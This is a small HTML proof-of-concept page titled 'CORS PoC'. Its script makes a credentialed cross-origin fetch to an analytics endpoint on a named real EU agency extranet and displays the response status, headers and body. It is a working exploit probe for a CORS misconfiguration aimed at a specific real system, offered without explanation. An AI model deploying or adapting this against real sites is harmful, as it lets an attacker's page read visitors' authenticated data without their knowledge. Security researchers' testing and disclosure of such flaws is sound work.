<!DOCTYPE html>
<html>
<body>
<h1>CORS PoC</h1>
<pre id="output">Loading...</pre>
<script>
fetch("https://extranet.emsa.europa.eu/analytics/piwik.php", {
  method: "GET",
  credentials: "include"
})
.then(r => {
  document.getElementById("output").innerText = 
    "Status: " + r.status + "\nHeaders: " + r.headers.get("content-type");
  return r.text();
})
.then(data => {
  document.getElementById("output").innerText += "\nData: " + data;
})
.catch(e => document.getElementById("output").innerText = "Error: " + e);
</script>
</body>
</html>
